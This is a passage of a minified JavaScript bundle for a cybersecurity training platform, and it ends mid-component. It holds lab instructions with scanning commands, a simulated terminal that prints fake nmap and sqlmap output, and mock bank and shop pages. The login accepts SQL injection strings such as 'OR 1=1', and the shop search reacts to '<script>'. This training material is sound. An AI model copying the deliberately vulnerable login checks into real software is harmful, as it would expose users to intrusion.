    `,completed:!1},{id:"insecure-design",title:"Insecure Design Analysis Lab",description:"Analyze and improve application design security",difficulty:"advanced",estimatedTime:"120 minutes",tools:["Threat Modeling Tools","Architecture Diagrams","Code Review"],instructions:`
# Insecure Design Analysis Lab

## Objective
Learn to identify design-level security flaws and apply secure design principles.

## Lab Components
- Application architecture documentation
- Source code repository
- Threat modeling templates
- Design review checklists

## Exercise 1: Threat Modeling
1. Analyze the provided application architecture
2. Identify assets, threats, and attack vectors
3. Create data flow diagrams
4. Perform threat risk assessment
5. Document security requirements

## Exercise 2: Business Logic Analysis
1. Review application workflows
2. Identify business logic flaws
3. Test for race conditions
4. Analyze state management issues
5. Find authorization bypass opportunities

## Exercise 3: Secure Design Implementation
1. Redesign vulnerable components
2. Apply security design patterns
3. Implement defense in depth
4. Add proper error handling
5. Design secure communication patterns

## Design Flaws to Identify
- Missing rate limiting on critical functions
- Inadequate input validation design
- Poor session management architecture
- Insecure direct object references by design
- Missing security controls in workflows

## Threat Modeling Process
1. **Define security objectives**
2. **Create application overview**
3. **Decompose application architecture**
4. **Identify threats using STRIDE**
5. **Document vulnerabilities**
6. **Rate threat risk**
7. **Design security controls**

## STRIDE Analysis
- **Spoofing**: Identity verification weaknesses
- **Tampering**: Data integrity protection gaps
- **Repudiation**: Insufficient logging/auditing
- **Information Disclosure**: Data confidentiality issues
- **Denial of Service**: Availability protection flaws
- **Elevation of Privilege**: Authorization control gaps

## Deliverables
- Complete threat model document
- Security requirements specification
- Secure architecture redesign
- Implementation recommendations
    `,completed:!1},{id:"security-misconfiguration",title:"Security Misconfiguration Lab",description:"Identify and fix common security misconfigurations",difficulty:"beginner",estimatedTime:"75 minutes",tools:["Nmap","Nikto","Browser","Configuration Scanners"],instructions:`
# Security Misconfiguration Lab

## Objective
Identify common security misconfigurations and implement proper security hardening.

## Lab Environment
- Target Servers: Multiple misconfigured services
- Web Applications: Various framework configurations
- Cloud Environment: AWS/Azure misconfigured resources

## Exercise 1: Web Server Misconfiguration
1. Scan for default pages and directories
2. Identify unnecessary services
3. Find missing security headers
4. Discover default credentials
5. Locate backup and temp files

## Exercise 2: Application Server Assessment
1. Check for debug mode enabled
2. Find exposed management interfaces
3. Identify verbose error messages
4. Locate configuration files
5. Test for default settings

## Exercise 3: Cloud Security Assessment
1. Review S3 bucket permissions
2. Check IAM role configurations
3. Analyze security group settings
4. Verify encryption settings
5. Assess logging configurations

## Scanning Commands
\`\`\`bash
# Port scanning
nmap -sS -O target_ip

# Web vulnerability scanning
nikto -h http://target

# Directory bruteforcing
dirb http://target /usr/share/wordlists/dirb/common.txt

# SSL/TLS testing
testssl.sh target:443
\`\`\`

## Security Headers to Check
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security
- X-XSS-Protection
- Referrer-Policy

## Common Misconfigurations
- Default passwords unchanged
- Unnecessary services running
- Missing security patches
- Open cloud storage buckets
- Overprivileged service accounts
- Missing encryption in transit/rest
- Weak TLS configurations
- Directory listing enabled

## Hardening Checklist
1. Change all default credentials
2. Disable unnecessary services
3. Apply security patches
4. Configure proper permissions
5. Enable security logging
6. Implement security headers
7. Configure SSL/TLS properly
8. Remove development/debug features
    `,completed:!1},{id:"vulnerable-components",title:"Vulnerable Components Lab",description:"Identify and manage vulnerable software components",difficulty:"intermediate",estimatedTime:"60 minutes",tools:["OWASP Dependency Check","Snyk","NPM Audit","Retire.js"],instructions:`
# Vulnerable Components Lab

## Objective
Learn to identify, assess, and manage vulnerable software components and dependencies.

## Lab Environment
- Sample applications with vulnerable dependencies
- Various package managers (npm, pip, maven)
- Vulnerability databases access
- Scanning tools and configurations

## Exercise 1: Dependency Scanning
1. Scan Node.js application dependencies
2. Identify vulnerable npm packages
3. Analyze Python requirements for CVEs
4. Check Java dependencies for known issues
5. Generate vulnerability reports

## Exercise 2: Vulnerability Analysis
1. Research identified CVEs
2. Assess exploitability and impact
3. Prioritize vulnerabilities by risk
4. Create remediation timeline
5. Document business impact

## Exercise 3: Remediation Implementation
1. Update vulnerable components
2. Apply security patches
3. Remove unused dependencies
4. Implement alternative solutions
5. Verify fixes and retest

## Scanning Tools and Commands
\`\`\`bash
# Node.js dependency scanning
npm audit
npm audit fix

# Python dependency scanning
pip-audit
safety check

# Java dependency scanning (using OWASP Dependency Check)
mvn org.owasp:dependency-check-maven:check

# Retire.js for JavaScript
retire --js --outputformat json
\`\`\`

## OWASP Dependency Check
\`\`\`bash
# Download and run dependency check
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.0.0/dependency-check-8.0.0-release.zip
unzip dependency-check-8.0.0-release.zip
./dependency-check/bin/dependency-check.sh --project "TestApp" --scan ./src --format HTML
\`\`\`

## Vulnerability Databases
- National Vulnerability Database (NVD)
- CVE Details
- Snyk Vulnerability Database
- GitHub Security Advisories
- Vendor security bulletins

## Component Inventory Tasks
1. Create comprehensive component list
2. Track version numbers
3. Monitor for updates
4. Assess component necessity
5. Plan upgrade schedules

## Risk Assessment Criteria
- CVSS score analysis
- Exploitability assessment
- Asset criticality
- Exposure level
- Available patches/workarounds

## Success Metrics
- All vulnerabilities identified and cataloged
- Risk assessment completed
- Remediation plan created
- Critical vulnerabilities patched
- Process documentation updated
    `,completed:!1}],a2=({onLabSelect:a})=>{const{user:n}=Ie(),s=i=>{switch(i){case"beginner":return"text-[#00FF88] border-[#00FF88]/30 bg-[#00FF88]/10";case"intermediate":return"text-yellow-400 border-yellow-400/30 bg-yellow-400/10";case"advanced":return"text-red-400 border-red-400/30 bg-red-400/10";default:return"text-slate-400 border-slate-400/30 bg-slate-400/10"}};return e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Virtual ",e.jsx("span",{className:"text-[#00FF88]",children:"Simulations"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"DEPLOY ACTIVE COUNTERMEASURES"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(Pn,{className:"h-5 w-5 text-[#00FF88]"})})]}),e.jsx("div",{className:"grid gap-6",children:ds.map(i=>{const o=i.difficulty==="advanced",c=o&&n?.subscription_tier!=="pro";return e.jsxs("div",{className:`bg-[#0A0F0A] rounded-xl border ${c?"border-[#00FF88]/5 opacity-75":"border-[#00FF88]/10 hover:border-[#00FF88]/30"} overflow-hidden transition-all duration-300 group relative`,children:[!c&&e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsx("div",{className:"p-6 relative",children:e.jsxs("div",{className:"flex items-start justify-between mb-6",children:[e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-2",children:[e.jsx("div",{className:`p-2 rounded ${c?"bg-gray-800 border-gray-700":"bg-[#00FF88]/10 border-[#00FF88]/20"} border`,children:c?e.jsx(vt,{className:"h-5 w-5 text-gray-500"}):e.jsx(He,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsx("h2",{className:`text-xl font-bold ${c?"text-gray-500":"text-white group-hover:text-[#00FF88]"} transition-colors tracking-tight`,children:i.title}),i.completed&&e.jsxs("div",{className:"px-2 py-0.5 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 text-[#00FF88] text-[10px] font-bold uppercase tracking-wider flex items-center gap-1",children:[e.jsx(Pe,{className:"h-3 w-3"})," Completed"]}),o&&e.jsx("div",{className:"px-2 py-0.5 rounded bg-yellow-400/10 border border-yellow-400/20 text-yellow-400 text-[10px] font-bold uppercase tracking-wider flex items-center gap-1",children:"PRO REQUIRED"})]}),e.jsx("p",{className:"text-[#00B37A] mb-6 max-w-2xl",children:i.description}),e.jsxs("div",{className:"flex items-center space-x-6 text-sm text-[#EAEAEA]/60 font-mono",children:[e.jsx("div",{className:"flex items-center space-x-2",children:e.jsx("span",{className:`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border ${s(i.difficulty)}`,children:i.difficulty})}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Pt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:i.estimatedTime})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(zt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"SOLO MISSION"})]})]}),e.jsxs("div",{className:"mt-6 pt-6 border-t border-[#00FF88]/10",children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-3",children:"Required Tools"}),e.jsx("div",{className:"flex flex-wrap gap-2",children:i.tools.map((d,m)=>e.jsx("span",{className:"bg-[#0A0F0A] text-[#EAEAEA] px-3 py-1 rounded border border-[#00FF88]/20 text-xs font-mono group-hover:border-[#00FF88]/40 transition-colors",children:d},m))})]})]}),e.jsxs("button",{onClick:()=>!c&&a(i.id),disabled:c,className:`flex items-center space-x-2 px-6 py-3 rounded-lg font-bold transition-all duration-300 ml-6 ${c?"bg-gray-800 text-gray-500 cursor-not-allowed border border-gray-700":i.completed?"bg-[#00FF88]/10 text-[#00FF88] hover:bg-[#00FF88]/20 border border-[#00FF88]/20":"bg-[#00FF88] text-black hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]"}`,children:[c?e.jsx(vt,{className:"h-4 w-4"}):e.jsx(He,{className:"h-4 w-4"}),e.jsx("span",{children:c?"LOCKED":i.completed?"REVIEW LOGS":"DEPLOY LAB"}),!c&&e.jsx(Or,{className:"h-4 w-4"})]})]})})]},i.id)})}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 p-6 relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-[linear-gradient(45deg,transparent_25%,rgba(0,255,136,0.02)_50%,transparent_75%,transparent_100%)] bg-[length:250%_250%,100%_100%] animate-[shimmer_3s_infinite]"}),e.jsxs("h2",{className:"text-xl font-bold text-white mb-6 flex items-center gap-2 relative z-10",children:[e.jsx(xs,{className:"h-5 w-5 text-[#00FF88]"}),"Simulation Metrics"]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6 relative z-10",children:[e.jsxs("div",{className:"text-center p-4 bg-black/40 rounded-lg border border-[#00FF88]/10",children:[e.jsx("div",{className:"text-3xl font-bold text-[#00FF88] mb-1 font-mono",children:ds.filter(i=>i.completed).length}),e.jsx("div",{className:"text-[#00B37A] text-xs uppercase tracking-wider",children:"Completed"})]}),e.jsxs("div",{className:"text-center p-4 bg-black/40 rounded-lg border border-[#00FF88]/10",children:[e.jsx("div",{className:"text-3xl font-bold text-yellow-400 mb-1 font-mono",children:ds.length-ds.filter(i=>i.completed).length}),e.jsx("div",{className:"text-[#00B37A] text-xs uppercase tracking-wider",children:"Pending"})]}),e.jsxs("div",{className:"text-center p-4 bg-black/40 rounded-lg border border-[#00FF88]/10",children:[e.jsxs("div",{className:"text-3xl font-bold text-[#00FF88] mb-1 font-mono",children:[Math.round(ds.filter(i=>i.completed).length/ds.length*100),"%"]}),e.jsx("div",{className:"text-[#00B37A] text-xs uppercase tracking-wider",children:"Success Rate"})]}),e.jsxs("div",{className:"text-center p-4 bg-black/40 rounded-lg border border-[#00FF88]/10",children:[e.jsxs("div",{className:"text-3xl font-bold text-[#EAEAEA] mb-1 font-mono",children:["~",ds.length*60]}),e.jsx("div",{className:"text-[#00B37A] text-xs uppercase tracking-wider",children:"Total Minutes"})]})]})]})]})})};class i2{root;currentPath;constructor(){this.root={name:"/",type:"directory",children:{home:{name:"home",type:"directory",permissions:"drwxr-xr-x",owner:"root",group:"root",size:4096,modified:new Date,children:{operator:{name:"operator",type:"directory",permissions:"drwxr-xr-x",owner:"operator",group:"operator",size:4096,modified:new Date,children:{"notes.txt":{name:"notes.txt",type:"file",content:"Mission Objective: Infiltrate the target system and retrieve the admin credentials.",permissions:"-rw-r--r--",owner:"operator",group:"operator",size:84,modified:new Date},tools:{name:"tools",type:"directory",permissions:"drwxr-xr-x",owner:"operator",group:"operator",size:4096,modified:new Date,children:{}}}}}},bin:{name:"bin",type:"directory",permissions:"drwxr-xr-x",owner:"root",group:"root",size:4096,modified:new Date,children:{}},etc:{name:"etc",type:"directory",permissions:"drwxr-xr-x",owner:"root",group:"root",size:4096,modified:new Date,children:{passwd:{name:"passwd",type:"file",content:`root:x:0:0:root:/root:/bin/bash
operator:x:1000:1000:operator:/home/operator:/bin/bash`,permissions:"-rw-r--r--",owner:"root",group:"root",size:102,modified:new Date}}}},permissions:"drwxr-xr-x",owner:"root",group:"root",size:4096,modified:new Date},this.currentPath=["home","operator"]}getCurrentPath(){return"/"+this.currentPath.join("/")}resolvePath(n){if(n==="/")return this.root;const s=n.startsWith("/")?n.split("/").filter(c=>c):[...this.currentPath,...n.split("/").filter(c=>c)];let i=this.root;const o=[];for(const c of s)c!=="."&&(c===".."?o.pop():o.push(c));for(const c of o){if(i.type!=="directory"||!i.children||!i.children[c])return null;i=i.children[c]}return i}listDirectory(n="."){const s=this.resolvePath(n);if(!s||s.type!=="directory"||!s.children)throw new Error(`ls: cannot access '${n}': No such file or directory`);return Object.values(s.children)}changeDirectory(n){const s=this.resolvePath(n);if(!s)throw new Error(`cd: ${n}: No such file or directory`);if(s.type!=="directory")throw new Error(`cd: ${n}: Not a directory`);if(n.startsWith("/"))this.currentPath=n.split("/").filter(i=>i);else{const i=n.split("/").filter(o=>o);for(const o of i)o===".."?this.currentPath.pop():o!=="."&&this.currentPath.push(o)}}readFile(n){const s=this.resolvePath(n);if(!s)throw new Error(`cat: ${n}: No such file or directory`);if(s.type==="directory")throw new Error(`cat: ${n}: Is a directory`);return s.content||""}writeFile(n,s){const i=n.split("/"),o=i.pop(),c=i.join("/"),d=this.resolvePath(c||".");if(!d||d.type!=="directory"||!d.children||!o)throw new Error(`touch: cannot touch '${n}': No such file or directory`);d.children[o]={name:o,type:"file",content:s,permissions:"-rw-r--r--",owner:"operator",group:"operator",size:s.length,modified:new Date}}}class o2{targets={"http://vulnerable-bank.lab:8080":{ip:"192.168.1.10",ports:[80,8080,22],vulnerabilities:[{type:"IDOR",parameter:"id",severity:"high",description:"Insecure Direct Object Reference in user profile"},{type:"SQL Injection",parameter:"username",severity:"critical",description:"SQLi in login form"}],endpoints:{"/":'<html><body><h1>Welcome to Vulnerable Bank</h1><a href="/login">Login</a></body></html>',"/login":'<html><body><form action="/auth" method="POST"><input name="username"><input name="password"></form></body></html>',"/api/users":'{"users": [{"id": 1, "name": "admin"}, {"id": 2, "name": "user"}]}'}},"http://shop.vulnerable.lab:8080":{ip:"192.168.1.20",ports:[80,443,8080,3306],vulnerabilities:[{type:"XSS",parameter:"search",severity:"medium",description:"Reflected XSS in search bar"},{type:"Command Injection",parameter:"ip",severity:"critical",description:"OS Command Injection in ping tool"}],endpoints:{"/":'<html><body><h1>Vulnerable Shop</h1><input name="search"></body></html>',"/admin":"403 Forbidden"}}};async fetch(n){await new Promise(c=>setTimeout(c,200+Math.random()*500));const s=Object.keys(this.targets).find(c=>n.startsWith(c));if(!s)return{status:404,statusText:"Not Found",data:"DNS_PROBE_FINISHED_NXDOMAIN",headers:{}};const i=n.replace(s,"")||"/",o=this.targets[s].endpoints[i];return o?{status:200,statusText:"OK",data:o,headers:{"Content-Type":"text/html",Server:"Apache/2.4.41"}}:{status:404,statusText:"Not Found",data:"404 Not Found",headers:{"Content-Type":"text/html"}}}scan(n){const s=Object.values(this.targets).find(i=>i.ip===n||Object.keys(this.targets).some(o=>o.includes(n)));return s?{ip:s.ip,ports:s.ports.map(i=>({port:i,state:"open",service:this.getService(i)})),os:"Linux 5.4.0-42-generic"}:{error:"Host down or unreachable"}}getService(n){return{21:"ftp",22:"ssh",80:"http",443:"https",3306:"mysql",8080:"http-proxy"}[n]||"unknown"}}class l2{fs;net;commandHistory=[];historyIndex=-1;constructor(){this.fs=new i2,this.net=new o2}async execute(n){const s=n.trim().split(/\s+/),i=s[0],o=s.slice(1);if(!i)return{output:"",type:"info"};this.commandHistory.push(n),this.historyIndex=this.commandHistory.length;try{switch(i){case"help":return{output:`
Available Commands:
  System:
    ls [path]       List directory contents
    cd <path>       Change directory
    pwd             Print working directory
    cat <file>      Read file content
    touch <file>    Create empty file
    clear           Clear terminal screen
    whoami          Display current user

  Network & Recon:
    nmap <target>   Network exploration and port scanner
    curl <url>      Transfer data from URL
    
  Exploitation:
    sqlmap -u <url> Automate SQL injection detection and exploitation
    hydra           Parallelized login cracker
            `,type:"info"};case"ls":return{output:this.fs.listDirectory(o[0]||".").map(m=>{const f=m.type==="directory"?"\x1B[34m":"\x1B[37m";return`${m.permissions} ${m.owner} ${m.group} ${m.size.toString().padStart(6)} ${m.modified.toLocaleTimeString()} ${f}${m.name}\x1B[0m`}).join(`
`),type:"success"};case"cd":return this.fs.changeDirectory(o[0]||"~"),{output:"",type:"success"};case"pwd":return{output:this.fs.getCurrentPath(),type:"success"};case"cat":if(!o[0])throw new Error("cat: missing file operand");return{output:this.fs.readFile(o[0]),type:"success"};case"touch":if(!o[0])throw new Error("touch: missing file operand");return this.fs.writeFile(o[0],""),{output:"",type:"success"};case"whoami":return{output:"operator",type:"success"};case"nmap":{if(!o[0])return{output:"nmap: missing target specification",type:"error"};const c=this.net.scan(o[0]);if(c.error)return{output:`Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.02 seconds`,type:"error"};let d=`Starting Nmap 7.92 ( https://nmap.org ) at ${new Date().toLocaleString()}
`;return d+=`Nmap scan report for ${o[0]} (${c.ip})
`,d+=`Host is up (0.0024s latency).
`,d+=`Not shown: 998 closed tcp ports (reset)
`,d+=`PORT     STATE SERVICE
`,c.ports.forEach(m=>{d+=`${m.port}/tcp ${m.state.padEnd(5)} ${m.service}
`}),d+=`
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds`,{output:d,type:"success"}}case"curl":return o[0]?{output:(await this.net.fetch(o[0])).data,type:"success"}:{output:"curl: try 'curl --help' for more information",type:"error"};case"sqlmap":{if(!o.includes("-u"))return{output:"sqlmap: missing url parameter (-u)",type:"error"};const c=o.indexOf("-u")+1;return o[c]?{output:`
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.11#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting at ${new Date().toLocaleTimeString()}

[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'id'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 time-based blind - Parameter replace' injectable 

[*] ending @ ${new Date().toLocaleTimeString()}
            `,type:"success"}:{output:"sqlmap: missing url",type:"error"}}default:return{output:`${i}: command not found`,type:"error"}}}catch(c){return{output:c.message,type:"error"}}}getHistory(n){return this.commandHistory.length===0?"":(n==="up"?this.historyIndex=Math.max(0,this.historyIndex-1):this.historyIndex=Math.min(this.commandHistory.length,this.historyIndex+1),this.commandHistory[this.historyIndex]||"")}}const c2=({onCommand:a})=>{const[n,s]=v.useState([]),[i,o]=v.useState(""),[c]=v.useState(()=>new l2),d=v.useRef(null),m=v.useRef(null);v.useEffect(()=>{s([{cmd:"",output:`Cyber Coach Terminal v2.0
Type "help" for available commands.`,type:"info"}])},[]),v.useEffect(()=>{d.current&&d.current.scrollIntoView({behavior:"smooth"})},[n]);const f=async x=>{if(x.key==="Enter"){const p=i.trim();if(!p)return;if(p==="clear"){s([]),o("");return}const b=await c.execute(p);s(w=>[...w,{cmd:p,output:b.output,type:b.type}]),o(""),a&&a(p)}else if(x.key==="ArrowUp"){x.preventDefault();const p=c.getHistory("up");o(p)}else if(x.key==="ArrowDown"){x.preventDefault();const p=c.getHistory("down");o(p)}};return e.jsxs("div",{className:"h-full bg-[#0A0F0A] font-mono text-sm flex flex-col border border-[#00FF88]/20 rounded-lg overflow-hidden shadow-[0_0_30px_rgba(0,255,136,0.05)]",onClick:()=>m.current?.focus(),children:[e.jsxs("div",{className:"bg-[#00FF88]/5 px-4 py-2 border-b border-[#00FF88]/10 flex items-center justify-between select-none",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(He,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{className:"text-[#00FF88] font-bold tracking-wider text-xs",children:"TERMINAL_ACCESS"})]}),e.jsxs("div",{className:"flex space-x-1.5",children:[e.jsx("div",{className:"w-2.5 h-2.5 rounded-full bg-red-500/20 border border-red-500/50"}),e.jsx("div",{className:"w-2.5 h-2.5 rounded-full bg-yellow-500/20 border border-yellow-500/50"}),e.jsx("div",{className:"w-2.5 h-2.5 rounded-full bg-green-500/20 border border-green-500/50"})]})]}),e.jsxs("div",{className:"flex-1 p-4 overflow-y-auto scrollbar-thin scrollbar-thumb-[#00FF88]/20 scrollbar-track-transparent",children:[n.map((x,p)=>e.jsxs("div",{className:"mb-4 animate-fade-in",children:[x.cmd&&e.jsxs("div",{className:"flex items-center text-[#00FF88] mb-1",children:[e.jsx("span",{className:"mr-2",children:"operator@cyber-coach:~$"}),e.jsx("span",{className:"text-white",children:x.cmd})]}),e.jsx("div",{className:`whitespace-pre-wrap leading-relaxed ${x.type==="error"?"text-red-400":x.type==="success"?"text-[#EAEAEA]":x.type==="warning"?"text-yellow-400":"text-[#00B37A]"}`,children:x.output})]},p)),e.jsxs("div",{className:"flex items-center text-[#00FF88]",children:[e.jsx("span",{className:"mr-2",children:"operator@cyber-coach:~$"}),e.jsx("input",{ref:m,type:"text",value:i,onChange:x=>o(x.target.value),onKeyDown:f,className:"flex-1 bg-transparent border-none outline-none text-white caret-[#00FF88]",autoFocus:!0,autoComplete:"off",spellCheck:"false"})]}),e.jsx("div",{ref:d})]})]})},d2=({initialUrl:a="http://vulnerable-bank.lab:8080"})=>{const[n,s]=v.useState(a),[i,o]=v.useState(!1),[c,d]=v.useState(null);v.useEffect(()=>{m(n)},[]);const m=x=>{o(!0),s(x),setTimeout(()=>{o(!1),f(x)},800)},f=x=>{x.includes("vulnerable-bank")?d(e.jsx(u2,{})):x.includes("shop.vulnerable")?d(e.jsx(h2,{})):d(e.jsxs("div",{className:"flex flex-col items-center justify-center h-full text-gray-500",children:[e.jsx(In,{className:"h-16 w-16 mb-4 opacity-20"}),e.jsx("h2",{className:"text-xl font-bold mb-2",children:"Site Not Found"}),e.jsx("p",{children:"DNS_PROBE_FINISHED_NXDOMAIN"})]}))};return e.jsxs("div",{className:"flex flex-col h-full bg-white rounded-lg overflow-hidden border border-gray-200 shadow-xl",children:[e.jsxs("div",{className:"bg-gray-100 border-b border-gray-200 p-2 flex items-center space-x-2",children:[e.jsxs("div",{className:"flex space-x-1 mr-2",children:[e.jsx("div",{className:"w-3 h-3 rounded-full bg-red-400"}),e.jsx("div",{className:"w-3 h-3 rounded-full bg-yellow-400"}),e.jsx("div",{className:"w-3 h-3 rounded-full bg-green-400"})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-gray-500",children:[e.jsx(ys,{className:"h-4 w-4 cursor-pointer hover:text-gray-700"}),e.jsx(Or,{className:"h-4 w-4 cursor-pointer hover:text-gray-700"}),e.jsx(Ba,{className:`h-4 w-4 cursor-pointer hover:text-gray-700 ${i?"animate-spin":""}`,onClick:()=>m(n)})]}),e.jsxs("div",{className:"flex-1 bg-white border border-gray-300 rounded-md px-3 py-1.5 text-sm flex items-center space-x-2",children:[e.jsx(vt,{className:"h-3 w-3 text-green-600"}),e.jsx("input",{type:"text",value:n,onChange:x=>s(x.target.value),onKeyDown:x=>x.key==="Enter"&&m(n),className:"flex-1 outline-none text-gray-700"})]})]}),e.jsxs("div",{className:"flex-1 overflow-auto bg-white relative",children:[i&&e.jsx("div",{className:"absolute inset-0 bg-white/80 z-10 flex items-center justify-center",children:e.jsx("div",{className:"w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"})}),c]})]})},u2=()=>{const[a,n]=v.useState("login"),[s,i]=v.useState(""),[o,c]=v.useState(""),[d,m]=v.useState(""),f=x=>{x.preventDefault(),s.includes("'")||s.includes("OR 1=1")||s==="admin"&&o==="admin123"?n("dashboard"):m("Invalid credentials")};return a==="dashboard"?e.jsxs("div",{className:"p-8 bg-gray-50 min-h-full",children:[e.jsxs("nav",{className:"bg-blue-900 text-white p-4 rounded-lg mb-8 flex justify-between items-center",children:[e.jsx("span",{className:"font-bold text-xl",children:"Vulnerable Bank"}),e.jsxs("div",{className:"flex space-x-4",children:[e.jsx("span",{children:"Accounts"}),e.jsx("span",{children:"Transfers"}),e.jsx("span",{children:"Profile"}),e.jsx("button",{onClick:()=>n("login"),className:"text-blue-200",children:"Logout"})]})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-8",children:[e.jsxs("div",{className:"bg-white p-6 rounded-lg shadow-sm border border-gray-200",children:[e.jsx("h3",{className:"text-lg font-bold text-gray-800 mb-4",children:"Account Overview"}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"flex justify-between items-center p-3 bg-blue-50 rounded",children:[e.jsx("span",{children:"Checking (...8842)"}),e.jsx("span",{className:"font-mono font-bold",children:"$1,337,420.00"})]}),e.jsxs("div",{className:"flex justify-between items-center p-3 bg-gray-50 rounded",children:[e.jsx("span",{children:"Savings (...9931)"}),e.jsx("span",{className:"font-mono font-bold",children:"$50,000.00"})]})]})]}),e.jsxs("div",{className:"bg-white p-6 rounded-lg shadow-sm border border-gray-200",children:[e.jsx("h3",{className:"text-lg font-bold text-gray-800 mb-4",children:"Recent Transactions"}),e.jsxs("table",{className:"w-full text-sm",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"text-left text-gray-500 border-b",children:[e.jsx("th",{className:"pb-2",children:"Date"}),e.jsx("th",{className:"pb-2",children:"Description"}),e.jsx("th",{className:"pb-2 text-right",children:"Amount"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{className:"border-b border-gray-100",children:[e.jsx("td",{className:"py-2",children:"2024-03-15"}),e.jsx("td",{children:"Payroll Deposit"}),e.jsx("td",{className:"text-right text-green-600",children:"+$5,000.00"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"py-2",children:"2024-03-14"}),e.jsx("td",{children:"Coffee Shop"}),e.jsx("td",{className:"text-right text-gray-600",children:"-$4.50"})]})]})]})]})]})]}):e.jsx("div",{className:"min-h-full bg-gray-100 flex items-center justify-center p-4",children:e.jsxs("div",{className:"bg-white p-8 rounded-lg shadow-md w-full max-w-md border border-gray-200",children:[e.jsxs("div",{className:"text-center mb-8",children:[e.jsx("div",{className:"w-12 h-12 bg-blue-900 rounded-full mx-auto mb-4 flex items-center justify-center",children:e.jsx(vt,{className:"text-white h-6 w-6"})}),e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"Secure Login"}),e.jsx("p",{className:"text-gray-500",children:"Welcome to Vulnerable Bank"})]}),d&&e.jsx("div",{className:"bg-red-50 text-red-600 p-3 rounded mb-4 text-sm border border-red-100",children:d}),e.jsxs("form",{onSubmit:f,className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Username"}),e.jsx("input",{type:"text",value:s,onChange:x=>i(x.target.value),className:"w-full p-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none",placeholder:"admin"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-1",children:"Password"}),e.jsx("input",{type:"password",value:o,onChange:x=>c(x.target.value),className:"w-full p-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 outline-none",placeholder:""})]}),e.jsx("button",{type:"submit",className:"w-full bg-blue-900 text-white py-2 rounded hover:bg-blue-800 transition-colors font-medium",children:"Sign In"})]}),e.jsx("div",{className:"mt-6 text-center text-xs text-gray-400",children:e.jsx("p",{children:"Protected by 256-bit encryption"})})]})})},h2=()=>{const[a,n]=v.useState(""),[s,i]=v.useState([]),o=c=>{c.preventDefault(),a.includes("<script>")&&alert("XSS Vulnerability Triggered! Cookie: JSESSIONID=12345"),i(["Product A","Product B","Product C"])};return e.jsxs("div",{className:"min-h-full bg-white",children:[e.jsx("header",{className:"bg-indigo-600 text-white p-4",children:e.jsxs("div",{className:"container mx-auto flex justify-between items-center",children:[e.jsx("h1",{className:"text-xl font-bold",children:"Vulnerable Shop"}),e.jsxs("form",{onSubmit:o,className:"flex",children:[e.jsx("input",{type:"text",value:a,onChange:c=>n(c.target.value),placeholder:"Search products...",className:"px-4 py-1 rounded-l text-gray-900 outline-none"}),e.jsx("button",{type:"submit",className:"bg-indigo-800 px-4 py-1 rounded-r hover:bg-indigo-900",children:"Search"})]})]})}),e.jsxs("main",{className:"container mx-auto 